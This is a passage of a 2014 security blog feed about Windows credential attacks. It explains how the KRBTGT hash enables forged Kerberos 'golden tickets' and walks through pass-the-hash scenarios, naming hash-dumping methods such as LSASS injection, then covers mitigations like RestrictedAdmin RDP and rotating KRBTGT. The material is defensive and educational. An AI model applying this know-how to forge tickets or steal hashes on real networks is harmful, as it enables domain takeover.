here:&amp;nbsp;http://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;Quick Oversimplified Kerberos Refresher&lt;/h2&gt;&lt;div&gt;IF you read all the links on Kerberos there&#39;s talks about TGTs, service tickets, principals, etc... I want to present just a simple way to quickly visualize what&#39;s going on with Kerberos.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Imagine yourself as a kid. &amp;nbsp;Mom needs to pick up a gallon of milk and the dry cleaning but needs to wait in the car for whatever reason. Fortunately, the cleaners and 7-11 are right next door to each other. &amp;nbsp;She hands you her credit card and tells you to go get the milk and then the dry cleaning and get back to the car.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;You walk into the 7-11, grab the milk, hand the credit card to the cashier and he lets you leave with the milk. &amp;nbsp;You then walk into the dry cleaners, tell them you&#39;re there for the pickup, hand them the credit card and you walk out with some shirts as well.&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;In this highly oversimplified example, the credit card is how you gain access to the services of the convenience store (the milk) and the dry cleaners. &amp;nbsp;You don&#39;t understand how the card works, only that you show it to the cashiers and they allow you to leave with the items.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;TGT (Ticket Granting Tickets) operate in much the same way. &amp;nbsp;When a kerberos principal (somebody who wants to access a service protected by kerberos) authenticates to the KDC, they provide their username and password and get a TGT in return. &amp;nbsp;This TGT operates in much the same way the credit card does. &amp;nbsp;Whenever the principal wants to access a service, they submit their request along with the TGT and based on the privileges contained in the TGT, the request will either be granted or denied.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;The nice thing about this TGT is that it is valid for a period of time. &amp;nbsp;This means that the user doesn&#39;t have to get prompted for their password for a period of time. &amp;nbsp;The TGT can simply be passed on and reused until the ticket expires.&lt;/div&gt;&lt;h2&gt;Why Does the Domain Trust the TGT?&lt;/h2&gt;&lt;div&gt;So what grants the TGT its mystical powers? &amp;nbsp;It&#39;s because part of it is encrypted using the NT &amp;nbsp;hash of the KRBTGT account and the other part is encrypted by the NTLM hash of the principal requesting it. &amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;This means that in order for it to be legit, 2 different principals have to agree that it&#39;s legit. &amp;nbsp;In essence, each side of the conversation has some assurance that the other side is who they claim to be since &quot;in theory&quot; the only way the TGT could be valid is that both sides can read their part.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;This is where Mimikatz comes into play.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;h2&gt;So How Old is the KRBTGT on Your Network?&lt;/h2&gt;&lt;div&gt;If we have a complete hashdump of the domain, then we have the password hash for the KRBTGT account. &amp;nbsp;Additionally, this account seemingly never changes its password. &amp;nbsp;The only instances where folks have reported that it changes is when the domain functional level changes during an upgrade, a point I will touch on in a sec. &lt;br /&gt;&lt;br /&gt;So, &amp;nbsp;for example, this is from my demo domain from 2012 that is still up and running that I use to test PTH tools against:&lt;br /&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://4.bp.blogspot.com/-9rBSJ-_QJEM/UwqBrnjpgZI/AAAAAAAAAHI/oWS3U7n68dM/s1600/krbtgt-demo-domain.jpg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://4.bp.blogspot.com/-9rBSJ-_QJEM/UwqBrnjpgZI/AAAAAAAAAHI/oWS3U7n68dM/s1600/krbtgt-demo-domain.jpg&quot; height=&quot;388&quot; width=&quot;640&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;Note that the password for the KRBTGT hasn&#39;t changed since March of 2012. &amp;nbsp;This is about the time I set the domain up to begin with.&lt;br /&gt;&lt;br /&gt;&lt;u&gt;So that means that regardless of the password policy in place on the network, this account has NOT changed its password in over 2 years.&lt;/u&gt; &amp;nbsp;Just in case you&#39;re wondering what your network looks like, try running &quot;net user krbtgt /domain&quot; from a command prompt on your local network.&lt;br /&gt;&lt;br /&gt;So, when does this hash / password change? &amp;nbsp;There is only one circumstance where this password &lt;i&gt;&lt;b&gt;automatically &lt;/b&gt;&lt;/i&gt;changes. &amp;nbsp;The password for the KRBTGT account only changes when the domain functional level is upgraded from a NT5 version (2000/2003) to a NT6 version (2008/2012). &amp;nbsp;If you move from 2008 -&amp;gt; 2012R2 domain functional level, this hash won&#39;t change.&lt;br /&gt;&lt;br /&gt;This hash can also be manually changed in a working AD, but this will cause all sorts of &quot;Bad Things(tm)&quot; to happen to your network, namely all Kerberos tickets will simultaneously die and in all likelihood demons will be summoned and a lot of puppies and kittens will be killed. &amp;nbsp;Not to mention Sysads.&lt;br /&gt;&lt;br /&gt;Seriously though, this process is as of right now unsupported by Microsoft and there has not been any official documentation regarding how this should take place and what the effects will be. &amp;nbsp;This will be forthcoming in the &quot;Not Too Distant Future(tm)&quot; as well, so keep an eye out for that.&lt;br /&gt;&lt;br /&gt;So, the net result is that your KRBTGT account is only as old as your transition from a NT5 domain funtional level to NT6. &amp;nbsp;If that happened back in 2008, then you hash is at least 6 years old. &amp;nbsp;If you are still on a 2003 domain, then it is even older.&lt;br /&gt;&lt;br /&gt;Assume that &quot;N&quot; is the amount of time since the KRBTGT account has changed. &amp;nbsp;Ultimately, if you have a password hash dump somewhere on your network from something less than N years ago, then the KRBTGT account could have been compromised. (Of course, said password dump could also be on pastebin too and archived by Google...) If you have a poorly configured backup of a domain controller on your network from less than N years ago, the KRBTGT account could have been compromised. &amp;nbsp;If there&#39;s an old domain controller that has been decommissioned but is still in your virtual machine library, ditto. &amp;nbsp;If there was a poorly redacted &amp;nbsp;pentest report showing the first few lines of a hashdump, ditto... and the list goes on....&lt;br /&gt;&lt;br /&gt;&lt;h2&gt;So, what&#39;s the BFD with this account?&lt;/h2&gt;The bottom line is this : If somebody has compromised the KRBTGT account and they have the domain SID (Security Identifier) for your domain, they can generate a ticket that can impersonate any user and put them into any group. &amp;nbsp;The users do not need to be enabled or even exist in the domain and they can still be put into the highly privileged groups in the domain, such as the domain or enterprise admins.&lt;br /&gt;&lt;br /&gt;So, this is definitely a &lt;b&gt;&lt;u&gt;Big Fscking Deal&lt;/u&gt;&lt;/b&gt;.&lt;br /&gt;&lt;br /&gt;Well touch more on this in the next post.&lt;/div&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/624733175774351488/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2014/08/mimikatz-and-golden-tickets-whats-bfd.html#comment-form' title='6 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/624733175774351488'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/624733175774351488'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2014/08/mimikatz-and-golden-tickets-whats-bfd.html' title='Mimikatz and Golden Tickets... What&#39;s the BFD? BlackHat USA 2014 Redux part 1'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://4.bp.blogspot.com/-9rBSJ-_QJEM/UwqBrnjpgZI/AAAAAAAAAHI/oWS3U7n68dM/s72-c/krbtgt-demo-domain.jpg" height="72" width="72"/><thr:total>6</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-4318124877761500872</id><published>2014-03-03T06:00:00.000-08:00</published><updated>2014-03-03T13:08:22.751-08:00</updated><title type='text'>Guest Post: Let&#39;s talk about Pass-the-Hash by Scriptjunkie</title><content type='html'>&lt;div dir=&quot;ltr&quot; id=&quot;docs-internal-guid-325b2fd3-85d4-bbd7-0979-fdcb89eb9f6e&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;March is Pass-the-Hash awareness month. (#PtHAwareness) Pass-the-Hash affects virtually all of us with Windows networks, but authentication issues like Pass-the-Hash are often misunderstood. This month, take time to ensure you are PtH aware and help us spread awareness. &amp;nbsp;&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;br /&gt;&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;&lt;a href=&quot;http://2.bp.blogspot.com/-1PhSs-r9pNk/UxPv1oted9I/AAAAAAAAAHY/Ijd7qGN6sno/s1600/PTH+Awareness+Month.jpeg&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;http://2.bp.blogspot.com/-1PhSs-r9pNk/UxPv1oted9I/AAAAAAAAAHY/Ijd7qGN6sno/s1600/PTH+Awareness+Month.jpeg&quot; height=&quot;320&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;h2 style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 10pt;&quot;&gt;&lt;span style=&quot;font-family: &#39;Trebuchet MS&#39;; font-size: 21px; font-weight: normal; vertical-align: baseline;&quot;&gt;What are the problems?&lt;/span&gt;&lt;/h2&gt;&lt;div&gt;&lt;span style=&quot;font-family: &#39;Trebuchet MS&#39;; font-size: 21px; font-weight: normal; vertical-align: baseline;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;Pass-the-Hash refers to using a password hash to authenticate to a remote Windows system. Password hashes for all local accounts are stored locally on all Windows computers, hashes for all domain accounts are stored on all domain controllers for a Windows domain, and hashes for currently-logged-in users whether local or domain are usually stored in memory in the computer the user is logged into. (some exceptions apply, see below for details) But &lt;/span&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; font-weight: bold; vertical-align: baseline;&quot;&gt;there are actually many attacks that pass hashes, and stopping one does not stop the rest&lt;/span&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;. It&#39;s debatable whether any one of these is more important or more significant than the others; all of them have been frequently used by pentesters and real hackers. Which one matters most changes depending who you ask, which is why one person can think X solves the problem, while another person doesn&#39;t think X touches the main problem, so why you need to understand all of the problems. To better explain, I&#39;ll give you them as a series of stories: &amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;br /&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;&lt;/span&gt;&lt;br /&gt;&lt;div dir=&quot;ltr&quot; style=&quot;margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;/div&gt;&lt;ol style=&quot;line-height: 1.15;&quot;&gt;&lt;li&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; line-height: 1.15;&quot;&gt;Evil hacker Eve compromises a workstation on the DOH windows domain with local admin privileges. (Maybe Eve compromised user DOH\Alice with a drive-by-download exploit or an Excel macro and escalated privileges using an HP driver vulnerability. Or maybe Eve physically snuck in and added a backdoor to the hard drive; it doesn&#39;t really matter; these things happen.) The first thing Eve does (after sitting back and evilly cackling Buwahahah!) is to dump the local hash database, which local administrators are allowed to do at least three different ways.* Eve now has the hashes for all local accounts. Eve now uses those user accounts and hashes to try to remotely compromise other systems on the same LAN. If the password to a local administrator accounts is the same, and the account is not prohibited from remotely logging in, Eve will succeed in remotely compromising those systems, owning more of the network and moving inevitably closer to world domination. &amp;nbsp;&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; line-height: 1.15;&quot;&gt;Evil hacker Eve compromises Alice&#39;s workstation on the DOH windows domain with local admin privileges, just like before. But this time, Eve searches memory for tokens of a DOH admin. Since Alice&#39;s computer needed a Java update yesterday, DOH\adminBob, a help desk admin remotely logged in via Remote Desktop to install it. Bob&#39;s hash is left in memory (along with his password if he used a password, and his Kerberos ticket). Eve steals Bob&#39;s hash and passes it to other computers, compromising all the workstations in the DOH domain, and stealing everybody&#39;s data. World dominated, since the adminBob account had privileges to remotely control all the workstations.&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;font-family: Arial;&quot;&gt;&lt;span style=&quot;font-size: 15px; line-height: 17.25px;&quot;&gt;Evil hacker Eve got access to the DOH hash database. Maybe Eve found a backup of a domain controller, maybe Eve snuck into the server racks, maybe Eve hacked one of the DOH domain admins or stole a ticket at one point in time. Eve now has the hashes to every account on the domain. Eve then uses that as a way to maintain elevated privileges. Eve can also use them to remotely pull all of the email from all users’ accounts if OWA accepts NTLM authentication. Eve can use these creds to log in as any domain user and quickly obtain access to any sharepoint page, database, etc. Eve can also use these hashes to compromise other domains if any user account or group in DOH has been granted privileges on another domain that has a trust relationship with DOH. If there is a VPN server using an MS-CHAP variant that accepts users’ passwords, Eve can now VPN in as any of those users. Eve can create a &quot;golden ticket&quot; (forged Kerberos ticket) using the hash of the KRBTGT account, which will allow Eve to authenticate as an admin even after the admin changes his or her password.&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; line-height: 17.25px;&quot;&gt;*inject LSASS &amp;amp; dump, export registry backup and extract, or raw disk volume access. One of Microsoft&#39;s new mitigations is restrictions preventing injecting into LSASS without a signed kernel driver, but since there are many ways to dump hashes and get kernel code running, it doesn&#39;t make a huge difference.&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; line-height: 17.25px;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;br /&gt;&lt;h2 style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 10pt;&quot;&gt;&lt;span style=&quot;font-family: &#39;Trebuchet MS&#39;; font-size: 21px; font-weight: normal; line-height: 1.15;&quot;&gt;It didn&#39;t have to be this way&lt;/span&gt;&lt;/h2&gt;&lt;div&gt;&lt;span style=&quot;font-family: &#39;Trebuchet MS&#39;; font-size: 21px; font-weight: normal; vertical-align: baseline;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;Some people simply accept all of these flaws as inherent in single-sign-on and centralized authentication. But they don&#39;t have to be. For example, it&#39;s easy to dismiss 3. saying &quot;Well, Eve already has full access to the domain&quot; but there&#39;s a few reasons why this doesn&#39;t have to be so bad. Let&#39;s suppose Alice &amp;amp; Bob find out their DOH domain was hacked. They change all the passwords to all the users. They look for and get rid of all malware. But Eve is able to quickly regain full control of the domain. Or maybe Alice &amp;amp; Bob added something like DNS whitelisting, which broke Eve&#39;s access until Eve sent another phishing email. But Eve doesn&#39;t have to do any work to re-escalate privileges since Eve has permanent stored credentials. &quot;Re-entry attacks&quot; are a real threat to real networks, and dramatically increase the cost of recovery. Let&#39;s think about some other ways Microsoft could have done it:&lt;/span&gt;&lt;/div&gt;&lt;br /&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;&lt;/span&gt; &lt;br /&gt;&lt;div dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; line-height: 1.15;&quot;&gt;Instead of saving a shared secret based on each user&#39;s password, Microsoft could have generated a password-derived public/private key pair, and only stored the public part. Story 1 and story 3 wouldn&#39;t exist, since stored hashes could not be re-used for authentication; there would be no pass-the-hash.&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; line-height: 1.15;&quot;&gt;Instead of saving creds in memory, Microsoft could have simply required users to enter their password every time they access a new network resource and used salted hashes or something like that. This would help address 2, but wouldn&#39;t be practical since everyone hates re-entering passwords.&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; line-height: 1.15;&quot;&gt;Microsoft could have stored a public key and required smart card auth for every network resource. This might slow down things, but would address 1, 2, and 3.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;&lt;/span&gt;&lt;br /&gt;&lt;div dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;In each of those alternatives, the attacker in 3 couldn&#39;t conduct many of those attacks without changing the password to a user, which is a big no-no for most serious attackers since users would notice and might blow the whole operation. PtH allows attackers to easily and silently obtain access to all users&#39; data without being detected.&lt;/span&gt;&lt;/div&gt;&lt;br /&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;&lt;/span&gt; &lt;br /&gt;&lt;div dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;But here we are; with two main ways to authenticate to a system. Either you log in and give your creds to the system or you don&#39;t. If you do, you probably logged in via RDP, or locally at the console, or via a saved password (e.g. service or batch logon). If you didn&#39;t, you used network authentication, either with Kerberos or NTLM. The hash is used directly in NTLM, but not in Kerberos. (If you&#39;re using passwords, the password hash will be used to get a Kerberos ticket, but not if you&#39;re using smart cards. In all cases, the hash of the krbtgt account will be used as the Kerberos controller&#39;s secret to authenticate and encrypt Kerberos tickets.) So as long as NTLM is enabled, the hash can be passed. And the krbtgt hash can be used to get yourself a Kerberos ticket at any time. Those can be stolen anywhere there is interactive authentication and used anywhere there is network authentication.&lt;/span&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;h2 dir=&quot;ltr&quot; id=&quot;docs-internal-guid--69eaba7-85d3-8d55-907f-6274d8c7ec6d&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 10pt;&quot;&gt;&lt;span style=&quot;font-family: &#39;Trebuchet MS&#39;; font-size: 17px; vertical-align: baseline;&quot;&gt;Stop Leaving Your Creds Lying All Around The Network&lt;/span&gt;&lt;/h2&gt;&lt;div&gt;&lt;span style=&quot;font-family: &#39;Trebuchet MS&#39;; font-size: 17px; vertical-align: baseline;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;For 2, Microsoft introduced new security features in Windows 8.1; by default domain accounts no longer store plaintext passwords in memory on a system, should clean up the hash and ticket better on logout, and if the account is a Protected User, the hash will not be present either (although a Kerberos TGT will be). If the account logged in remotely via RestrictedAdmin RDP, no stealable credentials will be put on the remote system at all. But that means in order to authenticate, RestrictedAdmin RDP now uses only network authentication, which means either NTLM or Kerberos will work by default. So you can now pass-the-hash (or ticket) to RDP. Of course, if you already had an admin hash, you could pass-the-hash with psexec and take over the remote system that way if windows SMB/RPC (ports 445,135,139...) were exposed, but because of the increased risk of these ports, there are millions of systems that are only exposed over RDP, and not SMB or RPC. They may soon become vulnerable to pass-the-hash. The advantage is that one of our biggest problems, the one I call &quot;leaving your creds lying all around the network&quot; is dramatically reduced, assuming your admins stick to RestrictedAdmin RDP. This is a big win, assuming you don&#39;t allow RDP anywhere you don&#39;t allow SMB.&lt;/span&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;&lt;br /&gt;&lt;span style=&quot;vertical-align: baseline;&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;Protected Users highlight the importance of 3; if a domain admin was a Protected User and logged into a compromised server, the attacker who controls that server would have temporary access to that domain admin&#39;s account via the TGT. By dumping the domain&#39;s hash database with that TGT, the attacker now has permanent access with full control over the domain. However, I still consider Protected Users an improvement since the exposure duration of kerberos tickets (a few hours) is vastly less than the exposure duration of hashes (good forever until password change). Microsoft also introduced authentication silos, which restrict where an account can log in from. If you can write that detailed of policies for your admins, e.g. only allow login from admin workstations, that will also help a lot. Anyone elsewhere in the network with their hash will be unable to pass-the-hash with their accounts. Of course that doesn&#39;t address all the user PtH.&lt;/span&gt;&lt;/div&gt;&lt;h2 dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 10pt;&quot;&gt;&lt;span style=&quot;font-family: &#39;Trebuchet MS&#39;; font-size: 17px; vertical-align: baseline;&quot;&gt;No Permanent Stored Credentials&lt;/span&gt;&lt;/h2&gt;&lt;div&gt;&lt;span style=&quot;font-family: &#39;Trebuchet MS&#39;; font-size: 17px; vertical-align: baseline;&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;For 3, if an attacker obtains access to your domain hash database, your only good option is to adopt a policy I call &quot;No permanent stored credentials.&quot; In order to do this, you must disable NTLM in your domain, and mandate that any account that can remotely authenticate uses a smart card. Then you must also shorten the computer account password change timeline and frequently (every few days) change the password to the krbtgt account to a random value as well. This will prevent any users&#39; hashes from being used in remote authentication, and no permanent credentials will ever be stored on disk or in-memory. You may not be able to implement this policy if you have a lot of legacy equipment and software, so some of my PtH cohorts don&#39;t like it, but I&#39;m the build-a-secure-network-guy and I highly recommend it if you are building a new network. No reason to keep doing stupid just because you&#39;ve always done stupid. This has big benefits; in addition to significantly reducing the exposure of credentials to theft, attackers will be forced to maintain access with malware on critical systems which you have a chance of finding, rather than simply holding creds to pull data at will, which you will have very little chance of finding. Attackers will find re-entry attacks much harder since any stolen or forged credentials will quickly become invalid.&lt;/span&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;&lt;br /&gt;&lt;span style=&quot;vertical-align: baseline;&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;Note that there are a &lt;a href=&quot;https://www.scriptjunkie.us/2013/06/fixing-pass-the-hash-and-other-problems/&quot; target=&quot;_blank&quot;&gt;lot of other problems&lt;/a&gt;&amp;nbsp;with Windows authentication, especially if you&#39;re using passwords. People leave them lying around in shared drives and sticky notes, they can be guessed, everyone reuses them, they&#39;re hard to remember, people type them into the pages that look like login pages but aren&#39;t, they&#39;re easy to lock out or brute force online, and their hashes whether salted, unsalted, or captured in a challenge-response can be cracked because hardware is cheap but human memory is terrible. And NTLM is just all-around bad. But this month, we&#39;re just talking about Pass-the-Hash.&lt;/span&gt;&lt;/div&gt;&lt;h1 dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 10pt;&quot;&gt;&lt;span style=&quot;font-family: &#39;Trebuchet MS&#39;; font-size: 21px; font-weight: normal; vertical-align: baseline;&quot;&gt;Bottom Line&lt;/span&gt;&lt;/h1&gt;&lt;div dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;is that hashes come from many places and can be used many ways. Microsoft&#39;s new mitigations can help you if you&#39;re careful, Keep Local Local; if you watch out for the other pitfalls, Stop Leaving Your Creds Lying All Around The Network; but I still recommend you have No Permanent Stored Credentials as well. And for crying out loud, get rid of passwords or &lt;a href=&quot;https://twitter.com/passingthehash/status/439180035337900032&quot; target=&quot;_blank&quot;&gt;this guy&lt;/a&gt; will hunt you down and crack them all.&lt;/span&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;span style=&quot;font-family: Arial; font-size: 15px; vertical-align: baseline;&quot;&gt;&lt;br /&gt;&lt;span style=&quot;vertical-align: baseline;&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div dir=&quot;ltr&quot; style=&quot;line-height: 1.15; margin-bottom: 0pt; margin-top: 0pt;&quot;&gt;&lt;br /&gt;&lt;/div&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/4318124877761500872/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2014/03/guest-post-lets-talk-about-pass-hash-by.html#comment-form' title='1 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/4318124877761500872'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/4318124877761500872'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2014/03/guest-post-lets-talk-about-pass-hash-by.html' title='Guest Post: Let&#39;s talk about Pass-the-Hash by Scriptjunkie'/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://2.bp.blogspot.com/-1PhSs-r9pNk/UxPv1oted9I/AAAAAAAAAHY/Ijd7qGN6sno/s72-c/PTH+Awareness+Month.jpeg" height="72" width="72"/><thr:total>1</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-2553438330081591224</id><published>2014-03-02T18:53:00.002-08:00</published><updated>2014-03-02T18:53:48.301-08:00</updated><title type='text'>March is (apparently) Pass-the-Hash Awareness Month! </title><content type='html'>Well, &amp;nbsp;thanks to a conversation with @jcran and Scriptjunkie1 (among others), apparently March is now &quot;Pass-the-Hash&quot; awareness month. &amp;nbsp;In that spirit, I&#39;m going to present a guest blog post by Scriptjunkie1.&lt;br /&gt;&lt;br /&gt;I&#39;m in the final process of editing it and making sure it looks proper on the blog, so I&#39;d expect it in the next day or so.&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</content><link rel='replies' type='application/atom+xml' href='http://passing-the-hash.blogspot.com/feeds/2553438330081591224/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='http://passing-the-hash.blogspot.com/2014/03/march-is-apparently-pass-hash-awareness.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/2553438330081591224'/><link rel='self' type='application/atom+xml' href='http://www.blogger.com/feeds/5968836134591949637/posts/default/2553438330081591224'/><link rel='alternate' type='text/html' href='http://passing-the-hash.blogspot.com/2014/03/march-is-apparently-pass-hash-awareness.html' title='March is (apparently) Pass-the-Hash Awareness Month! '/><author><name>Exorcyst</name><uri>http://www.blogger.com/profile/04354783607463944232</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-5968836134591949637.post-130486869577692175</id><published>2014-03-01T12:35:00.001-08:00</published><updated>2014-03-01T12:35:24.267-08:00</updated><category scheme="http://www.blogger.com/atom/ns#" term="microsoft"/><category scheme="http://www.blogger.com/atom/ns#" term="pass-the-hash"/><category scheme="http://www.blogger.com/atom/ns#" term="PtH"/><category scheme="http://www.blogger.com/atom/ns#" term="Russinovich"/><category scheme="http://www.blogger.com/atom/ns#" 